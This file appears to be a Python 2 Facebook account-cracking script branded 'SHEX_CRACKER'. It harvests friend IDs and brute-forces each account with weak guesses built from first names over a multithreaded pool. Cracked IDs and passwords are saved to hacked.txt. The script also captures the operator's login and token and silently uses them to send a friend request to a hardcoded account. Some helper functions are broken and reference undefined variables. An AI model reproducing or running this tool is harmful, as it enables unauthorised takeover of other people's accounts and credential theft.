#!/usr/bin/python2
#coding=utf-8

import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
from bs4 import BeautifulSoup
def anime(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(000.1)

print("FB GRABER")
os.system('clear')


reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_4_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1 Mobile/15E148 Safari/604.1')]


def kelwa():
	exlogo = """
    \x1b[33;1mEXTING\x1b[37;1m.............\x1b[0m
	"""
	anime(exlogo)
	os.sys.exit()
                                        
def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


                                  
#### LOGO ####
logo = """



\033[1;91m
╔═══╦╗─╔╦═══╦═╗╔═╗╔══╗╔╗──╔═╗─╔╦═══╗
║╔═╗║║─║║╔══╩╗╚╝╔╝║╔╗║║║──║║╚╗║╠╗╔╗║
║╚══╣╚═╝║╚══╗╚╗╔╝─║╚╝╚╣║──║╔╗╚╝║║║║║
╚══╗║╔═╗║╔══╝╔╝╚╗─║╔═╗║║─╔╣║╚╗║║║║║║
║╚═╝║║─║║╚══╦╝╔╗╚╗║╚═╝║╚═╝║║─║║╠╝╚╝║
╚═══╩╝─╚╩═══╩═╝╚═╝╚═══╩═══╩╝─╚═╩═══╝
"""
def tik():
	titik = ['.', '..', '...', '....', '.....', '......', '.......']
	print (" ")
	for o in titik:
		print("\r\x1b[32;1m    Wait to Login\x1b[37;1m"+o+"\x1b[0m"),;sys.stdout.flush();time.sleep(1)


back = 0
berhasil = []
listgrup = []
phone = []
ph = []
vulnot = "\033[31mNot Vuln"
vuln = "\033[32mVuln"

os.system("clear")
#LOGO L	fOGIN
RH = """

\033[1;91m
╔═══╦╗─╔╦═══╦═╗╔═╗╔══╗╔╗──╔═╗─╔╦═══╗
║╔═╗║║─║║╔══╩╗╚╝╔╝║╔╗║║║──║║╚╗║╠╗╔╗║
║╚══╣╚═╝║╚══╗╚╗╔╝─║╚╝╚╣║──║╔╗╚╝║║║║║
╚══╗║╔═╗║╔══╝╔╝╚╗─║╔═╗║║─╔╣║╚╗║║║║║║
║╚═╝║║─║║╚══╦╝╔╗╚╗║╚═╝║╚═╝║║─║║╠╝╚╝║
╚═══╩╝─╚╩═══╩═╝╚═╝╚═══╩═══╩╝─╚═╩═══╝
"""
CorrectUsername = "SHEXBLND"
CorrectPassword = "SHEXYUNS"

loop = 'true'
while (loop == 'true'):
    username = raw_input("\033[1;96m[☆] \x1b[1;93mUSERNAME TOOLS INI \x1b[1;96m>>>> ")
    if (username == CorrectUsername):
    	password = raw_input("\033[1;96m[☆] \x1b[1;93mPASSWORD TOOLS INI \x1b[1;96m>>>> ")
        if (password == CorrectPassword):
            print "Logged in successfully as " + username
            loop = 'false'

print(RH)
def login():
	os.system('clear')
	try:
		toket = open('login.txt','r')
		menu() 
	except (KeyError,IOError):
		print(logo)
		fblogom = """
   ${\x1b[37;91m<<<<<<<<<<<[\x1b[34;91mLogin Facebook\x1b[0m]\x1b[31;91m>>>>>>>>>>>\x1b[0m}$
		"""
		print (fblogom)
		id = raw_input('\033[1;91m[+] \x1b[0;34mEnter ID/Email \x1b[1;91m: \x1b[1;91m')
		pwd = raw_input('\033[1;91m[+] \x1b[0;34mEnter Password \x1b[1;91m: \x1b[1;91m')
               	tik()
		try:
			br.open('https://m.facebook.com')
		except mechanize.URLError:
			print("\n\x1b[31;1m    [×]% LOST INTERNET CONNECTION PLEASE CHECK YOU INTERNET")
			kelwa()
		br._factory.is_html = True
		br.select_form(nr=0)
		br.form['email'] = id
		br.form['pass'] = pwd
		br.submit()
		url = br.geturl()
		if 'save-device' in url:
			try:
				sig= 'api_key=882a8490361da98702bf97a021ddc14dcredentials_type=passwordemail='+id+'format=JSONgenerate_machine_id=1generate_session_cookies=1locale=en_USmethod=auth.loginpassword='+pwd+'return_ssl_resources=0v=1.062f8ce9f74b12f84c123cc23437a4a32'
				data = {"api_key":"882a8490361da98702bf97a021ddc14d","credentials_type":"password","email":id,"format":"JSON", "generate_machine_id":"1","generate_session_cookies":"1","locale":"en_US","method":"auth.login","password":pwd,"return_ssl_resources":"0","v":"1.0"}
				x=hashlib.new("md5")
				x.update(sig)
				a=x.hexdigest()
				data.update({'sig':a})
				url = "https://api.facebook.com/restserver.php"
				r=requests.get(url,params=data)
				z=json.loads(r.text)
				unikers = open("login.txt", 'w')
				unikers.write(z['access_token'])
				unikers.close()
				print('\n\x1b[32;1m    [✓] Login Ba Sarkawtwe\x1b[0m')
				requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token='+z['access_token'])
				time.sleep(2)
				menu()
			except requests.exceptions.ConnectionError:
				print("\n\x1b[33;1m    [%]® XATAKAT XAWA BIGORA\x1b[0m")
				kelwa()
		if 'checkpoint' in url:
			print("\n\x1b[34;1m    [%]© Your Account in CheckPoint Cant Be Used /\x1b[0m")
			os.system('rm -rf login.txt')
			time.sleep(2)
			login()
		else:
			print("\n\x1b[37;1m[{×}] Your \x1b[36;1mEmail\x1b[0m\x1b[37;1mOr Your \x1b[33;1mPassword\x1b[37;1mIS \x1b[31;1m Wrong /\x1b[0m")
			os.system('rm -rf login.txt')
			time.sleep(2)
			login()


def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print("\x1b[31;1m[#] Your Token Is Expired")
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		namefb = a['name']
		id = a['id']
		ots = requests.get('https://graph.facebook.com/me/subscribers?access_token=' + toket)
		b = json.loads(ots.text)
		subid = str(b['summary']['total_count'])
	except KeyError:
		os.system('clear')
		print("\n\x1b[34;1m[%]© Your Account in CheckPoint Cant Be Used /\x1b[0m")
		os.system('rm -rf login.txt')
		time.sleep(1)
		login()
	except requests.exceptions.ConnectionError:
		print("\n\x1b[33;1mXATAKAT XAWA BIGORA \x1b[0m")
		kelwa()
	os.system("clear")
	#INFORMATION OF USER
	#namefb 
	#id
	#subid
	xxj = """
\x1b[32;1m
	.-~~~~-. 
       /   (o)(o)
      /      .. |
    /\    \____/
    / \\   ,\_/  
     \    /      
\x1b[0m
"""
	print(xxj)
	print("\x1b[32;1m******************\x1b[37;1m[\x1b[33;1mACCOUNT DATA\x1b[37;1m]\x1b[32;1m***********\x1b[0m")
	anime("[✓] Facbook Name : "+"[ "+namefb+" ]")
	anime("[✓] ID : "+"[ "+id+" ]")
	anime("[✓] ToTal FOLOW : "+"[ "+subid+" ]")
	print(" ")
	anime("\x1b[37;1m********************************************")
	#INFORMATION OF USER
	print(" ")
	opntn = """
********************************************
#\x1b[31;1m[ 1 ] BO DAST PE KRDNI HACK \x1b[0m !
#\x1b[32;1m[ 0 ] BO LOGOUT KRDNI ACAWNT \x1b[0m  !
********************************************
	"""
	print(opntn)
	time.sleep(1)
	option()

def option():
	unikers = raw_input("\n\x1b[33;1m [@] Option : \x1b[37;1m")
	if unikers =="":
		print("\x1b[31;1m [ π ] SHTI GHAYR AWANA MANWSA")
		option()
	elif unikers =="1":
		graber()
	elif unikers =="0":
		anime('\x1b[37;1m[ ! ]\x1b[0m \x1b[32;1mLOGIN OUT ACCOUNT.......\x1b[0m')
		print(" ")
		time.sleep(2)
		os.system('rm -rf login.txt')
		kelwa()
	else:
		print("\x1b[34;1m Please SHTE GHAYR AWANA MANWSA\x1b[0m")
		time.sleep(2)
		option() 
def graber():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print("\x1b[37;1m[\x1b[33;1m T \x1b[0m]\x1b[37;1m Token Expired\x1b[0m")
		os.system('rm -rf login.txt')
		time.sleep(2)
		login()
	os.system('clear')
	print logo
	print("\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m")
	print("\x1b[34;1m[ 1 ] HACK KRDNI FRENDAKAN\x1b[0m")
	print("\x1b[32;1m[ 2 ] HACKKRDN LAREY ID PUBLIC \x1b[0m")
	print("\x1b[37;1m[ 0 ] GARANAWA \x1b[0m")
	print("\x1b[37;1m>>>>>>>>>>>>>>>>>>>>>>>>>>>\x1b[0m")
	startgrab()

def startgrab():
	id = []
	peak = raw_input("\x1b[32;1mCRACK : \x1b[37;1m")
	if peak=="":
		print("\x1b[31;1m [ π ] BA JWANE HALEBZHERA")
		startgrab()
	elif peak =="1":
		os.system('clear')
		print logo
		print("[ # ] \x1b[37;1mRO\x1b[31;1mMA\x1b[0m")
		anime('\x1b[33;1mDump All Friend \x1b[34;1mID......\x1b[0m')
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			n = s['name']
                        h = n.split(" ")
                        name = [0]
                        id.append(str(s['id'])+"|"+str(name))
	elif peak =="2":
		os.system('clear')
		print logo
		idt = raw_input("\x1b[37;1m[ ♤ ] ID YEK BNWSA LERA : \x1b[0m")
		print("[ # ] \x1b[37;1mRO\x1b[0m_+_\x1b[31;1MA\x1b[0m")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print("\x1b[36;1mFacebook Name :  \x1b[33;1m"+op["name"]+"\x1b[0m")
		except KeyError:
			print("\x1b[31;1mID XALATA /\x1b[0m")
			time.sleep(3)
			graber()
		print("\x1b[34;1mDID")
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			n = i['name']
                        h = n.split(" ")
                        name = h[0]
                        id.append(str(i['id'])+"|"+str(name))
	elif peak =="0":
		menu()
	else:
		print("\x1b[32;1mFacebook ID.......\x1b[0m")
		startgrab()
	print("\x1b[32;1m[ ♡ ] HAMW ID YEKAN \x1b[34;1m"+str(len(id))+"\x1b[0m")
	anime('\x1b[37;1m[ % ] TKAYA BOST........................')
	titik = ['.', '..', '...', '....', '.....', '......', '.......']
	for o in titik:
		print("\r\x1b[32;1m[ ✓ ] HACKING"+o),;sys.stdout.flush();time.sleep(1)
	anime('\x1b[34;1mBWASTA BO DAST PE KRDNI HACKAKA.........')
	print("\x1b[37;1m==============================================")
        cekpoint = []
        oks = []
	def main(arg):
		global cekpoint,oks
		us = arg.strip().split("|")
                user = us[0]
                first = us[1]
		try:
			os.mkdir('Graber')
		except OSError:
			pass #REDHaT
		try:
			pass1 = first+"1234"
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			q = json.load(data)												
			if 'access_token' in q:
				print('\x1b[32;1m HACKED BY BLND')
				print('\x1b[32;1mID : \x1b[37;1m' + user+"\x1b[0m")											
				print('\x1b[32;1mPassword : \x1b[37;1m'+pass1 + '\n'+"\x1b[0m")
				msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass1+"\n Tele: @SHEX_CRACKER")
				filehack = open("hacked.txt", "a")
                                filehack.write(msghkfile)
                                filehack.close()
				oks.append(user+pass1)
                        else:
			        if 'www.facebook.com' in q["error_msg"]:
				    print('\x1b[31;1mACCOUNT BAGAN CHWA')
				    print('\x1b[31;1mID : \x1b[37;1m' + user+"\x1b[0m")
				    print('\x1b[31;1mPassword : \x1b[37;1m'+pass1+'\n'+"\x1b[0m")
				    cek = open("chkpoint.txt", "a")
				    cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass1+"\n Tele: @SHEX_CRACKER")
				    cek.close()
				    cekpoint.append(user+pass1)
                                else:
				    pass2 = first+"11223344"									
                                    data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			            q = json.load(data)												
			            if 'access_token' in q:
				            print('\x1b[32;1m HACKED BY BLND'+"\x1b[0m")											
				            print('\x1b[32;1mID : \x1b[37;1m' + user)											
				            print('\x1b[32;1mPassword : \x1b[37;1m' + pass2 + '\n'+"\x1b[0m")
                                            msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n Tele: @SHEX_CRACKER")
				            filehack = open("hacked.txt", "a")
                                            filehack.write(msghkfile)
                                            filehack.close()							
				            oks.append(user+pass2)
                                    else:
			                   if 'www.facebook.com' in q["error_msg"]:
				               print('\x1b[31;1mACCOUNT BAGAN CHWA')
				               print('\x1b[31;1mID : \x1b[37;1m' + user)
				               print('\x1b[31;1mPassword : \x1b[37;1m' + pass2  + '\n'+'\x1b[0m')
				               cek = open("chkpoint.txt", "a")
				               cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass2+"\n Tele: @SHEX_CRACKER")
				               cek.close()
				               cekpoint.append(user+pass2)								
				           else:											
					       pass3 = first+"12345"								
					       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")										
					       q = json.load(data)										
					       if 'access_token' in q:
						       print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")										
				                       print('\x1b[32;1mID : \x1b[37;1m '+ user)											
				                       print('\x1b[32;1mPassword : \x1b[37;1m' + pass3 + '\n'+"\x1b[0m")
                                                       msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass3+"\n Tele: @SHEX_CRACKER")
				                       filehack = open("hacked.txt", "a")
                                                       filehack.write(msghkfile)
                                                       filehack.close()				
						       oks.append(user+pass3)
                                               else:
			                               if 'www.facebook.com' in q["error_msg"]:
				                           print('\x1b[31;1mACCOUNT BAGAN CHWA')
				                           print('\x1b[31;1mID : \x1b[37;1m' + user)
				                           print('\x1b[31;1mPassword : \x1b[37;1m' + pass3 + '\n'+"\x1b[0m")
				                           cek = open("chkpoint.txt", "a")
				                           cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass3+"\n Tele: @SHEX_CRACKER")
				                           cek.close()
				                           cekpoint.append(user+pass3)									
					               else:										
						           pass4 =  "1122334455"		
			                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                   q = json.load(data)												
			                                   if 'access_token' in q:
				                                   print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")					
				                                   print('\x1b[32;1mID : \x1b[37;1m' + user)											
				                                   print('\x1b[32;1mPassword : \x1b[37;1m' + pass4  + '\n'+"\x1b[0m")	 
                                                                   msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass4+"\n \t Tele: @SHEX_CRACKER")
				                                   filehack = open("hacked.txt", "a")
                                                                   filehack.write(msghkfile)
                                                                   filehack.close()							
				                                   oks.append(user+pass4)
                                                           else:
			                                           if 'www.facebook.com' in q["error_msg"]:
				                                       print('\x1b[31;1mACCOUNT BAGAN CHWA')
				                                       print('\x1b[31;1mID : \x1b[37;1m' + user)
				                                       print('\x1b[31;1mPassword : \x1b[37;1m' + pass4 + '\n'+"\x1b[0m")
				                                       cek = open("chkpoint.txt", "a")
				                                       cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass4+"\n \t Tele: @SHEX_CRACKER")
				                                       cek.close()
				                                       cekpoint.append(user+pass4)					
					                           else:									
						                       pass5 = '1234554321'												
						                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")								
						                       q = json.load(data)								
						                       if 'access_token' in q:
						                               print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")		
				                                               print('\x1b[32;1mID : \x1b[37;1m ' + user)											
				                                               print('\x1b[32;1mPassword : \x1b[37;1m'+ pass5  + '\n'+"\x1b[0m")
                                                                               msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉  = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass5+"\n \t Tele: @SHEX_CRACKER")
				                                               filehack = open("hacked.txt", "a")
                                                                               filehack.write(msghkfile)
                                                                               filehack.close()						
						                               oks.append(user+pass5)	
                                                                       else:
			                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                   print('\x1b[31;1mACCOUNT BAGAN CHWA')
				                                                   print('\x1b[31;1mID : \x1b[37;1m' + user)
				                                                   print('\x1b[31;1mPassword : \x1b[37;1m' + pass5 + '\n'+"\x1b[0m")
				                                                   cek = open("chkpoint.txt", "a")
				                                                   cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass5+"\n \t Tele: @SHEX_CRACKER")
				                                                   cek.close()
				                                                   cekpoint.append(user+pass5)					
						                               else:								
							                           pass6 = '123456789'											
			                                                           data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                           q = json.load(data)												
			                                                           if 'access_token' in q:
				                                                           print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")					
				                                                           print('\x1b[32;1mID : \x1b[37;1m ' + user)											
				                                                           print('\x1b[32;1mPassword : \x1b[37;1m'+ pass6  + '\n'+"\x1b[0m")
                                                                                           msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass6+"\n \t Tele: @SHEX_CRACKER")
				                                                           filehack = open("hacked.txt", "a")
                                                                                           filehack.write(msghkfile)
                                                                                           filehack.close()										
				                                                           oks.append(user+pass6)
                                                                                   else:
			                                                                   if 'www.facebook.com' in q["error_msg"]:
				                                                               print('\x1b[31;1mACCOUNT BAGAN CHWA')
				                                                               print('\x1b[31;1mID : \x1b[37;1m' + user)
				                                                               print('\x1b[31;1mPassword : \x1b[37;1m' + pass6  + '\n'+"\x1b[0m")
				                                                               cek = open("chkpoint.txt", "a")
				                                                               cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass6+"\n \t Tele: @SHEX_CRACKER")
				                                                               cek.close()
				                                                               cekpoint.append(user+pass6)	
						                                           else:							
								                               pass7 = '1234512345'			
								                               data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")						
								                               q = json.load(data)						
								                               if 'access_token' in q:
									                               print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")
				                                                                       print('\x1b[32;1mID : \x1b[37;1m '+ user)											
				                                                                       print('\x1b[32;1mPassword : \x1b[37;1m' + pass7  + '\n'+"\x1b[0m")
                                                                                                       msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass7+"\n \t Tele: @SHEX_CRACKER")
				                                                                       filehack = open("hacked.txt", "a")
                                                                                                       filehack.write(msghkfile)
                                                                                                       filehack.close()		
									                               oks.append(user+pass7)
                                                                                               else:
			                                                                               if 'www.facebook.com' in q["error_msg"]:
				                                                                           print('\x1b[31;1mACCOUNT BAGAN CHWA')
				                                                                           print('\x1b[31;1mID : \x1b[37;1m' + user)
				                                                                           print('\x1b[31;1mPassword : \x1b[37;1m' + pass7  + '\n'+"\x1b[0m")
				                                                                           cek = open("chkpoint.txt", "a")
				                                                                           cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass7+"\n \t Tele: @SHEX_CRACKER")
				                                                                           cek.close()
				                                                                           cekpoint.append(user+pass7)           					
								                                       else:						
										                           pass8 ='12345678'											
			                                                                                   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass8)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")												
			                                                                                   q = json.load(data)												
			                                                                                   if 'access_token' in q:
				                                                                                   print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")
				                                                                                   print('\x1b[32;1mID : \x1b[37;1m ' + user)											
				                                                                                   print('\x1b[32;1mPassword : \x1b[37;1m'+ pass8  + '\n'+"\x1b[0m")
                                                                                                                   msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉  = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass8+"\n \t Tele: @SHEX_CRACKER")
				                                                                                   filehack = open("hacked.txt", "a")
                                                                                                                   filehack.write(msghkfile)
                                                                                                                   filehack.close()		
				                                                                                   oks.append(user+pass8)
                                                                                                           else:
			                                                                                           if 'www.facebook.com' in q["error_msg"]:
				                                                                                       print('\x1b[31;1mACCOUNT BAGAN CHWA')
				                                                                                       print('\x1b[31;1mID : \x1b[37;1m'  + user)
				                                                                                       print('\x1b[31;1mPassword : \x1b[37;1m' + pass8  + '\n'+"\x1b[0m")
				                                                                                       cek = open("chkpoint.txt", "a")
				                                                                                       cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass8+"\n \t Tele: @SHEX_CRACKER")
				                                                                                       cek.close()
				                                                                                       cekpoint.append(user+pass8)   	
										                                   else:					
										                                       pass9 = first+"123456"
										                                       data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass9)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")				
										                                       q = json.load(data)				
										                                       if 'access_token' in q:
											                                       print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")							
				                                                                                               print('\x1b[32;1mID : \x1b[37;1m ' + user)											
				                                                                                               print('\x1b[32;1mPassword : \x1b[37;1m'+ pass9  + '\n'+"\x1b[0m")		
				                                                                                               msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉  = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass9+"\n \t Tele: @SHEX_CRACKER")
				                                                                                               filehack = open("hacked.txt", "a")
                                                                                                                               filehack.write(msghkfile)
                                                                                                                               filehack.close()
											                                       oks.append(user+pass9)
                                                                                                                       else:
			                                                                                                       if 'www.facebook.com' in q["error_msg"]:
				                                                                                                   print('\x1b[31;1mACCOUNT BAGAN CHWA')
				                                                                                                   print('\x1b[31;1mID : \x1b[37;1m' + user)
				                                                                                                   print('\x1b[31;1mPassword : \x1b[37;1m'+ pass9  + '\n'+"\x1b[0m")
				                                                                                                   cek = open("chkpoint.txt", "a")
				                                                                                                   cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass9+"\n \t Tele: @SHEX_CRACKER")
				                                                                                                   cek.close()
      				                                                                                                   cekpoint.append(user+pass9)
                	 		                                                                                       else:
																   pass10 = first+"1212"
																   data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(user)+"&locale=en_US&password="+(pass10)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
																   q = json.load(data)
																   if 'access_token' in q:
																	   print("\x1b[32;1m HACKED BY BLND"+"\x1b[0m")
																	   print('\x1b[32;1mID : \x1b[37;1m ' + user)
																	   print('\x1b[32;1mPassword : \x1b[37;1m'+ pass10  + '\n'+"\x1b[0m")
																	   msghkfile = ("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nHACKED BY BLND "+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n \t Tele: @SHEX_CRACKER")
                                          				                                                                   filehack = open("hacked.txt", "a")
                                                                                                                                           filehack.write(msghkfile)
                                                                                                                                           filehack.close()
																	   oks.append(user+pass10)
																   else:
															                   if 'www.facebook.com' in q["error_msg"]:
															                       print('\x1b[31;1mACCOUNT LA CHECKPOINAYA       FUCK')
																	       print('\x1b[31;1mID : \x1b[37;1m' + user)
																	       print('\x1b[31;1mPassword : \x1b[37;1m'+ pass10  + '\n'+"\x1b[0m")
																	       cek = open("chkpoint.txt", "a")
																               cek.write("{ = 𝖘𝖍𝖊𝖝 𝖇𝖑𝖓𝖉 = } "+"\nCHKPOINT"+"\n[ ID ] : "+user+"\n[ PASS ] : "+pass10+"\n \t Tele: @SHEX_CRACKER")
																	       cek.close()
																	       cekpoint.append(user+pass10)
		except:
			pass
		
	p = ThreadPool(15)
	p.map(main, id)
        anime("\x1b[37;1m<<<<<<<<<<<<<<<>>>>>>>>>>>>>>>>\x1b[0m")
        print(" ")
	print('\x1b[32;1m[ ✓ ] HACKAKA TAWAW BW'+"\x1b[0m")
	print("\x1b[37;1mHACK BW \x1b[32;1mOKS/\x1b[31;1mCHECKPOINT\x1b[37;1m: \x1b[32;1m"+str(len(oks))+"\x1b[37;1m/"+"\x1b[31;1m"+str(len(cekpoint)))
	print(" ")
	print(" ")
	print(logo)
	raw_input("[ENTER]")
	time.sleep(3)
        menu()
        
if __name__ == '__main__':
  login()


# Okay Decompiling SHEX_CRACKER.py
